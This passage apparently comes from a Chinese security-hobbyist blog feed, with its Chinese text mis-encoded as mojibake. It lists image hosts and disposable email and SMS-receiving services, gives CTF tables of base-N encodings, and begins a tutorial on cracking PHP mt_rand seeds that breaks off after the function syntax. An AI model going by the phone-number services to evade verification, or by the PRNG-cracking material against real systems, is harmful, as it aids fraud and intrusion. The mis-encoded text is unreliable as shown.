        <content type="html"><![CDATA[<h1 id="ÂõæÂ∫ä"><a href="#ÂõæÂ∫ä" class="headerlink" title="ÂõæÂ∫ä"></a>ÂõæÂ∫ä</h1><p>ÁªôÂ§ßÂÆ∂Êé®Ëçê‰∏Ä‰∫õÂÖçË¥πÂ•ΩÁî®ÁöÑ‰ºòË¥®ÂõæÂ∫äÔºö</p><p>1„ÄÅSM.MSÔºö<a href="https://sm.ms/">https://sm.ms</a></p><p>2„ÄÅimgboxÔºö<a href="https://imgbox.com/">https://imgbox.com</a></p><p>3„ÄÅPostimageÔºö<a href="https://postimages.org/">https://postimages.org</a></p><p>4„ÄÅimgurlÔºö<a href="https://imgurl.org/">https://imgurl.org</a></p><p>5„ÄÅË∑ØËøáÂõæÂ∫äÔºö<a href="https://imgchr.com/">https://imgchr.com</a></p><p>6„ÄÅCoding ÂõæÂ∫äÔºö<a href="http://picbed.librejo.cn/">http://picbed.librejo.cn</a></p><p>7„ÄÅÂõæÂ∫ìÔºö<a href="http://tuku.link/">http://tuku.link</a></p><p>8„ÄÅÁâõÂõæÁΩëÔºö<a href="https://www.niupic.com/">https://www.niupic.com</a></p><p>ÈúÄË¶ÅÁôªÂΩïÁöÑÂõæÂ∫äÔºö</p><p>1„ÄÅimgurÔºö<a href="https://imgur.com/">https://imgur.com</a></p><p>2„ÄÅËÅöÂêàÂõæÂ∫äÔºö<a href="https://www.superbed.cn/">https://www.superbed.cn</a></p><p>3„ÄÅhualigsÔºö<a href="https://www.hualigs.cn/">https://www.hualigs.cn</a></p><p>4„ÄÅHello ÂõæÂ∫äÔºö<a href="https://www.helloimg.com/">https://www.helloimg.com</a></p>]]></content>
      
      
      <categories>
          
          <category> Â∞èÂ∑•ÂÖ∑ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>‰∏¥Êó∂ÈÇÆÁÆ±Âíå‰∏¥Êó∂ÊâãÊú∫Âè∑</title>
      <link href="/2022/12/28/%E4%B8%B4%E6%97%B6%E9%82%AE%E7%AE%B1/"/>
      <url>/2022/12/28/%E4%B8%B4%E6%97%B6%E9%82%AE%E7%AE%B1/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="‰∏¥Êó∂ÈÇÆÁÆ±"><a href="#‰∏¥Êó∂ÈÇÆÁÆ±" class="headerlink" title="‰∏¥Êó∂ÈÇÆÁÆ±"></a>‰∏¥Êó∂ÈÇÆÁÆ±</h1><p>‰∏¥Êó∂ÈÇÆÁÆ±Êúâ‰ªÄ‰πàÁî®ÔºüÊúâÊó∂ÂÄôÊ≥®ÂÜåÊüê‰∫õÊúçÂä°ÂøÖÈ°ªÊèê‰æõÈÇÆÁÆ±Ôºå‰ΩÜ‰Ω†Âèà‰∏çÊÉ≥‰ΩøÁî®‰Ω†Â∏∏Áî®ÁöÑÈÇÆÁÆ±ÔºåÂõ†‰∏∫‰Ω†‰∏çÊÉ≥Êî∂Âà∞‰∏çÂøÖË¶ÅÁöÑÂûÉÂúæÈÇÆ‰ª∂„ÄÇ<br>ÂèàÊúâ‰∫õÊó∂ÂÄô‰Ω†Âè™ÊòØÊÉ≥ËØïÁî®‰∏ÄÊ¨°Êüê‰∫õÊúçÂä°Ôºå‰Ω†‰∏çÊÉ≥‰ΩøÁî®Â∏∏Áî®ÈÇÆÁÆ±Ê≥®ÂÜå„ÄÇ<br>‰∏¥Êó∂ÈÇÆÁÆ±Â∫îËøêËÄåÁîüÔºåÂú®Ê≥®ÂÜåËøô‰∫õ‰∏çÈáçË¶ÅÁöÑÊúçÂä°Êó∂‰ΩøÁî®‰∏¥Êó∂ÈÇÆÁÆ±‰Ωú‰∏∫ÊõøË∫´ÊòØ‰∏™ÂæàÂ•ΩÁöÑÈÄâÊã©„ÄÇ<br>‰∏¥Êó∂ÈÇÆÁÆ±ÂÖ∑ÊúâÂåøÂêçÊÄßÔºåËÉΩÊúâÊïàÂáèÂ∞ëÂûÉÂúæÈÇÆ‰ª∂„ÄÇ</p><h2 id="ÈÇÆÁÆ±ÁΩëÂùÄ"><a href="#ÈÇÆÁÆ±ÁΩëÂùÄ" class="headerlink" title="ÈÇÆÁÆ±ÁΩëÂùÄ"></a>ÈÇÆÁÆ±ÁΩëÂùÄ</h2><p><a href="https://temp-mail.org/zh">https://temp-mail.org/zh</a></p><p><a href="https://www.mohmal.com/zh">https://www.mohmal.com/zh</a></p><p><a href="https://10minutemail.net/">https://10minutemail.net</a></p><p><a href="https://www.yinsiduanxin.com/mail.html">https://www.yinsiduanxin.com/mail.html</a></p><p><a href="https://bccto.me/">https://bccto.me</a></p><p><a href="https://www.guerrillamail.com/zh">https://www.guerrillamail.com/zh</a></p><p><a href="http://mailcatch.com/">http://mailcatch.com</a></p><p><a href="https://10minutemail.com/">https://10minutemail.com</a></p><p><a href="http://www.yopmail.com/zh">http://www.yopmail.com/zh</a></p><p><a href="https://9em.org/">https://9em.org</a></p><p><a href="http://0x5f3759df.cn/">http://0x5f3759df.cn</a></p><h1 id="ÊâãÊú∫Âè∑"><a href="#ÊâãÊú∫Âè∑" class="headerlink" title="ÊâãÊú∫Âè∑"></a>ÊâãÊú∫Âè∑</h1><p>‰∏¥Êó∂ÊâãÊú∫Âè∑Êúâ‰ªÄ‰πàÁî®ÔºüÊúâÊó∂ÂÄôÊ≥®ÂÜåÊüê‰∫õÊúçÂä°ÂøÖÈ°ªÊèê‰æõÊâãÊú∫Âè∑Ôºå‰ΩÜ‰Ω†Âèà‰∏çÊÉ≥‰ΩøÁî®‰Ω†Â∏∏Áî®ÁöÑÊâãÊú∫Âè∑ÔºåÂõ†‰∏∫‰Ω†‰∏çÊÉ≥Êî∂Âà∞‰∏çÂøÖË¶ÅÁöÑÂûÉÂúæÁü≠‰ø°„ÄÇ<br>ÂèàÊúâ‰∫õÊó∂ÂÄô‰Ω†Âè™ÊòØÊÉ≥ËØïÁî®‰∏ÄÊ¨°Êüê‰∫õÊúçÂä°Ôºå‰Ω†‰∏çÊÉ≥‰ΩøÁî®Â∏∏Áî®ÊâãÊú∫Âè∑Ê≥®ÂÜå„ÄÇ<br>‰∏¥Êó∂ÊâãÊú∫Âè∑Â∫îËøêËÄåÁîüÔºåÂú®Ê≥®ÂÜåËøô‰∫õ‰∏çÈáçË¶ÅÁöÑÊúçÂä°Êó∂‰ΩøÁî®‰∏¥Êó∂ÊâãÊú∫Âè∑‰Ωú‰∏∫ÊõøË∫´ÊòØ‰∏™ÂæàÂ•ΩÁöÑÈÄâÊã©„ÄÇ<br>‰∏¥Êó∂ÊâãÊú∫Âè∑ÂÖ∑ÊúâÂåøÂêçÊÄßÔºåËÉΩÊúâÊïàÂáèÂ∞ëÂûÉÂúæÁü≠‰ø°„ÄÇ</p><p>ËøôÈáåÊàëÁªôÂ§ßÂÆ∂Êé®Ëçê‰∏Ä‰∫õÂ•ΩÁî®ÁöÑÂõΩÂÜÖÂ§ñÂÖçË¥πÁü≠‰ø°Êé•Á†ÅÂπ≥Âè∞Ôºö</p><h2 id="ÊâãÊú∫Âè∑ÁΩëÂùÄ"><a href="#ÊâãÊú∫Âè∑ÁΩëÂùÄ" class="headerlink" title="ÊâãÊú∫Âè∑ÁΩëÂùÄ"></a>ÊâãÊú∫Âè∑ÁΩëÂùÄ</h2><p>1„ÄÅSMS Receive FreeÔºö<a href="https://smsreceivefree.com/">https://smsreceivefree.com</a></p><p>2„ÄÅ‰∫ëÊé•Á†ÅÔºö<a href="https://yunjiema.net/">https://yunjiema.net</a></p><p>3„ÄÅÂ∞èÈ∏üÊé•Á†ÅÔºö<a href="http://www.xnsms.com/">http://www.xnsms.com</a></p><p>4„ÄÅÊé•Á†ÅÂè∑Ôºö<a href="https://jiemahao.com/">https://jiemahao.com</a></p><p>5„ÄÅshejiinnÔºö<a href="https://www.shejiinn.com/">https://www.shejiinn.com</a></p><p>6„ÄÅmffacÔºö<a href="https://www.mffac.com/">https://www.mffac.com</a></p><p>7„ÄÅ‰∫ëÁü≠‰ø°Ôºö<a href="https://yunduanxin.net/">https://yunduanxin.net</a></p><p>8„ÄÅÂÖçË¥πÊé•Á†ÅÔºö<a href="https://mianfeijiema.com/">https://mianfeijiema.com</a></p><p>9„ÄÅFreePhoneNumÔºö<a href="https://freephonenum.com/">https://freephonenum.com</a></p><p>10„ÄÅZUSMSÔºö<a href="https://www.zusms.com/">https://www.zusms.com</a></p><p>11„ÄÅFree Online PhoneÔºö<a href="https://www.freeonlinephone.org/">https://www.freeonlinephone.org</a></p><p>12„ÄÅreceiveasmsÔºö<a href="https://receiveasms.com/">https://receiveasms.com</a></p><p>13„ÄÅmaterialtoolsÔºö<a href="https://www.materialtools.com/">https://www.materialtools.com</a></p><p>14„ÄÅreceivesmsonlineÔºö<a href="https://www.receivesmsonline.net/">https://www.receivesmsonline.net</a></p><p>15„ÄÅReceive SMS OnlineÔºö<a href="http://receive-sms-online.com/">http://receive-sms-online.com</a></p><p>16„ÄÅMICSMSÔºö<a href="https://www.micsms.com/">https://www.micsms.com</a></p><p>17„ÄÅÈöêÁßÅÁü≠‰ø°Ôºö<a href="https://www.yinsiduanxin.com/">https://www.yinsiduanxin.com</a></p><p>18„ÄÅbecmdÔºö<a href="https://www.becmd.com/">https://www.becmd.com</a></p><p>19„ÄÅz-smsÔºö<a href="http://www.z-sms.com/">http://www.z-sms.com</a></p><p>20„ÄÅÈöèÁî®ÈöèÂºÉÔºö<a href="https://www.suiyongsuiqi.com/">https://www.suiyongsuiqi.com</a></p><p>21„ÄÅwe39Ôºö<a href="https://www.we39.cn/">https://www.we39.cn</a></p>]]></content>
      
      
      <categories>
          
          <category> Â∞èÂ∑•ÂÖ∑ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Crypto‰∏≠ÂèØËÉΩÁî®ÁöÑÂØÜÁ†Å</title>
      <link href="/2022/12/19/Crypto%E4%B8%AD%E5%8F%AF%E8%83%BD%E7%94%A8%E7%9A%84%E5%AF%86%E7%A0%81/"/>
      <url>/2022/12/19/Crypto%E4%B8%AD%E5%8F%AF%E8%83%BD%E7%94%A8%E7%9A%84%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="Â∏∏ËßÅÁöÑÂØÜÁ†ÅÁâπÂæÅ"><a href="#Â∏∏ËßÅÁöÑÂØÜÁ†ÅÁâπÂæÅ" class="headerlink" title="Â∏∏ËßÅÁöÑÂØÜÁ†ÅÁâπÂæÅ"></a>Â∏∏ËßÅÁöÑÂØÜÁ†ÅÁâπÂæÅ</h1><h2 id="baseÂØÜÁ†Å"><a href="#baseÂØÜÁ†Å" class="headerlink" title="baseÂØÜÁ†Å"></a>baseÂØÜÁ†Å</h2><h3 id="base100"><a href="#base100" class="headerlink" title="base100"></a>base100</h3><p><strong>ÁâπÁÇπÔºöÂØÜÊñáÁî± Emoji Ë°®ÊÉÖÁªÑÊàê„ÄÇ</strong></p><table><thead><tr><th>ÂéüÊñá</th><th>base100Âä†ÂØÜ</th></tr></thead><tbody><tr><td>flag</td><td>üëùüë£üëòüëû</td></tr><tr><td>flag{gycfev123FGH_}</td><td>üëùüë£üëòüëûüë≤üëûüë∞üëöüëùüëúüë≠üê®üê©üê™üêΩüêæüêøüëñüë¥</td></tr></tbody></table><h3 id="base92"><a href="#base92" class="headerlink" title="base92"></a>base92</h3><p><em>ÁâπÂæÅÁâπÁÇπÔºöÂØÜÊñáÁî±92‰∏™Â≠óÁ¨¶Ôºà0-9Ôºåa-zÔºåA-Z,!#$%&amp;()</em>+,.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{|}‚Äù~Ôºâ*ÁªÑÊàê<br><strong>ÊØîbase91Â§ö‰∏Ä‰∏™ „ÄÇ</strong></p><h3 id="base91"><a href="#base91" class="headerlink" title="base91"></a>base91</h3><p><strong>ÁâπÁÇπÔºöÂØÜÊñáÁî±91‰∏™Â≠óÁ¨¶Ôºà0-9Ôºåa-zÔºåA-Z,!#$%&amp;()*+,.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{|}~‚ÄùÔºâÁªÑÊàê „ÄÇ</strong></p><table><thead><tr><th>ÂéüÊñá</th><th>base91Âä†ÂØÜ</th></tr></thead><tbody><tr><td>flag</td><td>@iH&lt;Z</td></tr><tr><td>flag{ASD231fgh_hj}</td><td>@iH&lt;,{cSBMB.9*gkg}Q2S}A</td></tr></tbody></table><h3 id="base85"><a href="#base85" class="headerlink" title="base85"></a>base85</h3><p><strong>ÁâπÁÇπÔºöÂ•áÊÄ™ÁöÑÂ≠óÁ¨¶ÊØîËæÉÂ§öÔºå‰ΩÜÊòØÂæàÈöæÂá∫Áé∞Á≠âÂè∑„ÄÇ</strong></p><table><thead><tr><th>ÂéüÊñá</th><th>base85Âä†ÂØÜ</th></tr></thead><tbody><tr><td>flag</td><td>Ao(mg</td></tr><tr><td>flag{}JK_gisyu</td><td>Ao(mgH[SLZ?Y&#x3D;(oH$‚Äô</td></tr></tbody></table><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p><strong>ÁâπÁÇπÔºöÂØÜÊñáÁî±64‰∏™Â≠óÁ¨¶(A-Z,a-z,0-9,+,&#x2F;)ÁªÑÊàêÔºå‰∏ÄËà¨ÊÉÖÂÜµ‰∏ãÂØÜÊñáÂ∞æÈÉ®ÈÉΩ‰ºöÊúâ‰∏§‰∏™Á≠âÂè∑ÔºåÊòéÊñáÂæàÂ∞ëÁöÑÊó∂ÂÄôÂàôÊ≤°ÊúâÔºõ</strong></p><table><thead><tr><th>ÂéüÊñá</th><th>base64Âä†ÂØÜ</th></tr></thead><tbody><tr><td>flag{asdfgs1sedfvfvdfd2345_}</td><td>ZmxhZ3thc2RmZ3Mxc2VkZnZmdmRmZDIzNDVffQ&#x3D;&#x3D;</td></tr><tr><td>flag{asdfgsdfd2345_}</td><td>ZmxhZ3thc2RmZ3NkZmQyMzQ1X30&#x3D;</td></tr><tr><td>flag</td><td>ZmxhZw&#x3D;&#x3D;</td></tr><tr><td>sdfdfc</td><td>c2RmZGZj</td></tr></tbody></table><h3 id="base62"><a href="#base62" class="headerlink" title="base62"></a>base62</h3><p><strong>ÁâπÂæÅÁâπÁÇπÔºöÂØÜÊñáÁî±62Â≠óÁ¨¶Ôºà0-9Ôºåa-zÔºåA-ZÔºâÁªÑÊàê</strong></p><h3 id="base58"><a href="#base58" class="headerlink" title="base58"></a>base58</h3><p><strong>ÁâπÁÇπÔºö Base58ÊòØÁî®‰∫éBitcoin‰∏≠‰ΩøÁî®ÁöÑ‰∏ÄÁßçÁã¨ÁâπÁöÑÁºñÁ†ÅÊñπÂºèÔºå‰∏ªË¶ÅÁî®‰∫é‰∫ßÁîüBitcoinÁöÑÈí±ÂåÖÂú∞ÂùÄÔºåBase58‰∏ç‰ΩøÁî®Êï∞Â≠ó‚Äù0‚ÄùÔºåÂ≠óÊØçÂ§ßÂÜô‚ÄùO‚ÄùÔºåÂ≠óÊØçÂ§ßÂÜô‚ÄùI‚ÄùÔºåÂíåÂ≠óÊØçÂ∞èÂÜô‚Äùl‚ÄùÔºå‰ª•Âèä‚Äù+‚ÄùÂíå‚Äù&#x2F;‚ÄùÁ¨¶Âè∑</strong></p><table><thead><tr><th>ÂéüÊñá</th><th>base58Âä†ÂØÜ</th></tr></thead><tbody><tr><td>flag</td><td>3cr9Ae</td></tr><tr><td>flag{4561230ASDO}</td><td>xpoetRNMzw3NmoorXfTgNTn</td></tr></tbody></table><h3 id="base36"><a href="#base36" class="headerlink" title="base36"></a>base36</h3><p><strong>ÁâπÁÇπÔºöÂØÜÊñáÁî±36‰∏™Â≠óÁ¨¶Ôºà0-9,a-zÔºâÁªÑÊàêÔºåÂä†ÂØÜ‰ªÖÊîØÊåÅÊï¥Êï∞Êï∞Â≠óÔºåËß£ÂØÜ‰ªÖÊîØÊåÅÂ≠óÁ¨¶‰∏≤Ôºå‰∏çÊîØÊåÅ‰∏≠Êñá ÂØÜÊñáÁî±36‰∏™Â≠óÁ¨¶Ôºà0-9,A-ZÔºâ</strong></p><table><thead><tr><th>ÂéüÊñá</th><th>base36Âä†ÂØÜ</th></tr></thead><tbody><tr><td>123456</td><td>2n9c</td></tr><tr><td>10</td><td>a</td></tr><tr><td>9</td><td>9</td></tr><tr><td>11</td><td>b</td></tr></tbody></table><h3 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h3><p><strong>ÁâπÁÇπÔºöÂØÜÊñáÁî±32‰∏™Â≠óÁ¨¶ÔºàA-Z,2-7)ÁªÑÊàêÔºåÊú´Â∞æÂèØËÉΩ‰ºöÊúâ‚Äò&#x3D;‚ÄôÔºå‰ΩÜÊúÄÂ§öÊúâ6‰∏™„ÄÇ</strong></p><table><thead><tr><th>ÂéüÊñá</th><th>base32Âä†ÂØÜ</th></tr></thead><tbody><tr><td>flag</td><td>MZWGCZY&#x3D;</td></tr><tr><td>flag{123asd}</td><td>MZWGCZ33GEZDGYLTMR6Q&#x3D;&#x3D;&#x3D;&#x3D;</td></tr><tr><td>flag{123asd_sxvhgjh}</td><td>MZWGCZ33GEZDGYLTMRPXG6DWNBTWU2D5</td></tr></tbody></table><h3 id="base16"><a href="#base16" class="headerlink" title="base16"></a>base16</h3><p><strong>ÁâπÁÇπÔºöÂØÜÊñáÁî±16‰∏™Â≠óÁ¨¶Ôºà0-9,A-FÔºâ„ÄÇ</strong></p><table><thead><tr><th>ÂéüÊñá</th><th>base16Âä†ÂØÜ</th></tr></thead><tbody><tr><td>flag</td><td>666C6167</td></tr><tr><td>flag{dujv_1236}</td><td>666C61677B64756A765F313233367D</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Áü•ËØÜÁÇπ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php‰πã‰º™ÈöèÊú∫Êï∞ÁàÜÁ†¥</title>
      <link href="/2022/12/17/php%E4%B9%8B%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4/"/>
      <url>/2022/12/17/php%E4%B9%8B%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="PHPÁöÑ‰º™ÈöèÊú∫Êï∞ÁàÜÁ†¥"><a href="#PHPÁöÑ‰º™ÈöèÊú∫Êï∞ÁàÜÁ†¥" class="headerlink" title="PHPÁöÑ‰º™ÈöèÊú∫Êï∞ÁàÜÁ†¥"></a>PHPÁöÑ‰º™ÈöèÊú∫Êï∞ÁàÜÁ†¥</h1><h2 id="ÈöèÊú∫Êï∞Âπ∂‰∏çÈöèÊú∫"><a href="#ÈöèÊú∫Êï∞Âπ∂‰∏çÈöèÊú∫" class="headerlink" title="ÈöèÊú∫Êï∞Âπ∂‰∏çÈöèÊú∫"></a>ÈöèÊú∫Êï∞Âπ∂‰∏çÈöèÊú∫</h2><p>È¶ñÂÖàÈúÄË¶ÅÂ£∞ÊòéÁöÑÊòØÔºåËÆ°ÁÆóÊú∫‰∏ç‰ºö‰∫ßÁîüÁªùÂØπÈöèÊú∫ÁöÑÈöèÊú∫Êï∞ÔºåËÆ°ÁÆóÊú∫Âè™ËÉΩ‰∫ßÁîü‚Äú‰º™ÈöèÊú∫Êï∞‚Äù„ÄÇÂÖ∂ÂÆûÁªùÂØπÈöèÊú∫ÁöÑÈöèÊú∫Êï∞Âè™ÊòØ‰∏ÄÁßçÁêÜÊÉ≥ÁöÑÈöèÊú∫Êï∞ÔºåÂç≥‰ΩøËÆ°ÁÆóÊú∫ÊÄéÊ†∑ÂèëÂ±ïÔºåÂÆÉ‰πü‰∏ç‰ºö‰∫ßÁîü‰∏Ä‰∏≤ÁªùÂØπÈöèÊú∫ÁöÑÈöèÊú∫Êï∞„ÄÇËÆ°ÁÆóÊú∫Âè™ËÉΩÁîüÊàêÁõ∏ÂØπÁöÑÈöèÊú∫Êï∞ÔºåÂç≥‰º™ÈöèÊú∫Êï∞„ÄÇ</p><p><strong>‰º™ÈöèÊú∫Êï∞Âπ∂‰∏çÊòØÂÅáÈöèÊú∫Êï∞ÔºåËøôÈáåÁöÑ‚Äú‰º™‚ÄùÊòØÊúâËßÑÂæãÁöÑÊÑèÊÄùÔºåÂ∞±ÊòØËÆ°ÁÆóÊú∫‰∫ßÁîüÁöÑ‰º™ÈöèÊú∫Êï∞Êó¢ÊòØÈöèÊú∫ÁöÑÂèàÊòØÊúâËßÑÂæãÁöÑ„ÄÇ</strong>  ÊÄéÊ†∑ÁêÜËß£Âë¢Ôºü‰∫ßÁîüÁöÑ‰º™ÈöèÊú∫Êï∞ÊúâÊó∂ÈÅµÂÆà‰∏ÄÂÆöÁöÑËßÑÂæãÔºåÊúâÊó∂‰∏çÈÅµÂÆà‰ªª‰ΩïËßÑÂæãÔºõ‰º™ÈöèÊú∫Êï∞Êúâ‰∏ÄÈÉ®ÂàÜÈÅµÂÆà‰∏ÄÂÆöÁöÑËßÑÂæãÔºõÂè¶‰∏ÄÈÉ®ÂàÜ‰∏çÈÅµÂÆà‰ªª‰ΩïËßÑÂæã„ÄÇÊØîÂ¶Ç‚Äú‰∏ñ‰∏äÊ≤°Êúâ‰∏§ÁâáÂΩ¢Áä∂ÂÆåÂÖ®Áõ∏ÂêåÁöÑÊ†ëÂè∂‚ÄùÔºåËøôÊ≠£ÊòØÁÇπÂà∞‰∫Ü‰∫ãÁâ©ÁöÑÁâπÊÄßÔºåÂç≥ÈöèÊú∫ÊÄßÔºå‰ΩÜÊòØÊØèÁßçÊ†ëÁöÑÂè∂Â≠êÈÉΩÊúâËøë‰ººÁöÑÂΩ¢Áä∂ÔºåËøôÊ≠£ÊòØ‰∫ãÁâ©ÁöÑÂÖ±ÊÄßÔºåÂç≥ËßÑÂæãÊÄß„ÄÇ‰ªéËøô‰∏™ËßíÂ∫¶ËÆ≤Ôºå‰Ω†Â§ßÊ¶ÇÂ∞±‰ºöÊé•ÂèóËøôÊ†∑ÁöÑ‰∫ãÂÆû‰∫ÜÔºö<strong>ËÆ°ÁÆóÊú∫Âè™ËÉΩ‰∫ßÁîü‰º™ÈöèÊú∫Êï∞ËÄå‰∏çËÉΩ‰∫ßÁîüÁªùÂØπÈöèÊú∫ÁöÑÈöèÊú∫Êï∞</strong>„ÄÇ</p><p><strong>ÁúüÈöèÊú∫Êï∞Âíå‰º™ÈöèÊú∫Êï∞ÁöÑÊ¶ÇÂøµ</strong></p><ul><li>ÁúüÈöèÊú∫Êï∞ÂèëÁîüÂô®ÔºöËã±Êñá‰∏∫Ôºötrue random number generators ÔºåÁÆÄÁß∞‰∏∫ÔºöTRNGsÔºåÊòØÂà©Áî®‰∏çÂèØÈ¢ÑÁü•ÁöÑÁâ©ÁêÜÊñπÂºèÊù•‰∫ßÁîüÁöÑÈöèÊú∫Êï∞„ÄÇ</li><li>‰º™ÈöèÊú∫Êï∞ÂèëÁîüÂô®ÔºöËã±Êñá‰∏∫Ôºöpseudo-random number generators ÔºåÁÆÄÁß∞‰∏∫ÔºöPRNGsÔºåÊòØËÆ°ÁÆóÊú∫Âà©Áî®‰∏ÄÂÆöÁöÑÁÆóÊ≥ïÊù•‰∫ßÁîüÁöÑ„ÄÇ</li></ul><h2 id="PHPÁöÑ‰º™ÈöèÊú∫Êï∞ÊúâÂÖ≥ÁöÑ‰∏§‰∏™ÂáΩÊï∞"><a href="#PHPÁöÑ‰º™ÈöèÊú∫Êï∞ÊúâÂÖ≥ÁöÑ‰∏§‰∏™ÂáΩÊï∞" class="headerlink" title="PHPÁöÑ‰º™ÈöèÊú∫Êï∞ÊúâÂÖ≥ÁöÑ‰∏§‰∏™ÂáΩÊï∞"></a>PHPÁöÑ‰º™ÈöèÊú∫Êï∞ÊúâÂÖ≥ÁöÑ‰∏§‰∏™ÂáΩÊï∞</h2><h3 id="mt-rand"><a href="#mt-rand" class="headerlink" title="mt_rand()"></a>mt_rand()</h3><p>mt_rand() ÂáΩÊï∞‰ΩøÁî® Mersenne Twister ÁÆóÊ≥ïËøîÂõûÈöèÊú∫Êï¥Êï∞ÔºàÈöèÊú∫Êï∞ÁîüÊàêÂô®Ôºâ„ÄÇ</p><p><strong>ËØ≠Ê≥ï</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mt_rand</span><span class="token punctuation">(</span>min<span class="token punctuation">,</span>max<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>ËØ¥Êòé</strong></p><p>Â¶ÇÊûúÊ≤°ÊúâÊèê‰æõÂèØÈÄâÂèÇÊï∞ min Âíå maxÔºåmt_rand() ËøîÂõû 0 Âà∞ RAND_MAX ‰πãÈó¥ÁöÑ‰º™ÈöèÊú∫Êï∞„ÄÇ</p><p>ÂæàÂ§öËÄÅÁöÑ libc ÁöÑÈöèÊú∫Êï∞ÂèëÁîüÂô®ÂÖ∑Êúâ‰∏Ä‰∫õ‰∏çÁ°ÆÂÆöÂíåÊú™Áü•ÁöÑÁâπÊÄßËÄå‰∏îÂæàÊÖ¢„ÄÇPHP ÁöÑ rand() ÂáΩÊï∞ÈªòËÆ§‰ΩøÁî® libc  ÈöèÊú∫Êï∞ÂèëÁîüÂô®„ÄÇmt_rand() ÂáΩÊï∞ÊòØÈùûÊ≠£ÂºèÁî®Êù•ÊõøÊç¢ÂÆÉÁöÑ„ÄÇËØ•ÂáΩÊï∞Áî®‰∫Ü Mersenne Twister  ‰∏≠Â∑≤Áü•ÁöÑÁâπÊÄß‰Ωú‰∏∫ÈöèÊú∫Êï∞ÂèëÁîüÂô®ÔºåÂÆÉÂèØ‰ª•‰∫ßÁîüÈöèÊú∫Êï∞ÂÄºÁöÑÂπ≥ÂùáÈÄüÂ∫¶ÊØî libc Êèê‰æõÁöÑ rand() Âø´ÂõõÂÄç„ÄÇ</p><p><strong>‰æãÂ≠ê</strong></p><p>Âú®Êú¨‰æã‰∏≠ÔºåÊàë‰ª¨‰ºöËøîÂõû‰∏Ä‰∫õÈöèÊú∫Êï∞Ôºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËæìÂá∫Á±ª‰ººÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">3150906288</span><span class="token number">513289678</span><span class="token number">35</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="mt-srand"><a href="#mt-srand" class="headerlink" title="mt_srand()"></a>mt_srand()</h3><p>mt_srand() Êí≠Áßç Mersenne Twister ÈöèÊú∫Êï∞ÁîüÊàêÂô®„ÄÇ</p><p><strong>ËØ≠Ê≥ï</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mt_srand</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ÂèÇÊï∞ seedÔºöËßÑÂÆöÊí≠ÁßçÂÄº„ÄÅÁî® seed Êù•ÁªôÈöèÊú∫Êï∞ÂèëÁîüÂô®Êí≠Áßç„ÄÇ</p><p><strong>‰æãÂ≠ê</strong><br> Âú®Êú¨‰æã‰∏≠ÔºåÊàë‰ª¨Â∞ÜÊí≠ÁßçÈöèÊú∫Êï∞ÁîüÊàêÂô®Ôºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">mktime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ËæìÂá∫Á±ª‰ººÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1132656473</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ËøôÊÆµ‰ª£Á†ÅÁöÑÊÑèÊÄùÊòØÔºåÊòØÈÄöËøámt_srandÂàÜÂèëseedÁßçÂ≠êÔºåÁÑ∂ÂêéÁßçÂ≠êÊúâ‰∫ÜÂêéÔºåÊâçËÉΩÈù†mt_rand()Êù•ÁîüÊàêÈöèÊú∫Êï∞„ÄÇ</p><h4 id="‰∏∫‰ªÄ‰πàÈöèÊú∫Êï∞Ë¶ÅÁî®ÁßçÂ≠êÊí≠ÁßçÔºåÂØπÁßçÂ≠êÁöÑÁêÜËß£"><a 